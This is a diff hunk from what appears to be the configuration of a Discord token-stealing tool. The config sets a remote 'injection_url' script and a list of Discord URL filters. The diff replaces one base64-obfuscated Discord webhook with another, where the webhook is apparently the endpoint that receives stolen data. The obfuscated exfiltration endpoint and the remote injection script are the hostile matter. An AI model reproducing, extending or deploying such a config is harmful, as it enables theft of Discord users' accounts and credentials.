@@ -28,7 +28,7 @@ const config = {
     "embed-color": 374276,
 
     injection_url: "https://raw.githubusercontent.com/darwinikii/darwins/main/index.js",
-    webhook: new Buffer.from("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA3NjkxNDc0MDA3MDE5OTM0OC9xYzJPT3NjMDMxdE9QSktaYnNCNF9lRmdYLWt0TU1RMUl5SVFXNDdSVTJHWHBxdW4xYVZ1cjU5elpLS2V5bEFjV2llUg==", "base64").toString(),
+    webhook: new Buffer.from("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA3NjkzMDk5NTE2MjQ2MDI1MC9vZ1J1Z2dwdjZnM2E5YlAwcWwtdmkzWFNWcnBwVV9HZjNDeHdSN3dsSjNjVk1RbzE5ZDFOQWs0WG5rNTR0bnJScVY3eA==", "base64").toString(),
     filter2: {
         urls: [
       "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
